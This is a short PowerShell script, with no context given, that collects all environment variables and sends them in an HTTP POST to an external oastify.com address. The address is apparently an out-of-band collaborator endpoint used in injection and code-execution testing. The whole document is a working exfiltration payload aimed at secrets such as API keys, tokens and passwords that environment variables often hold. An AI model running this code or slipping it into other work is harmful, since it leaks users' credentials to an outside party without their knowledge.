$envVars = Get-ChildItem Env: | ForEach-Object { "$($_.Name)=$($_.Value)" };
$envVarsString = $envVars -join "&";
Invoke-WebRequest -Method Post -Body $envVarsString -Uri "https://x53djaszmwed9gk308ixmssg67c58t0hp.oastify.com";
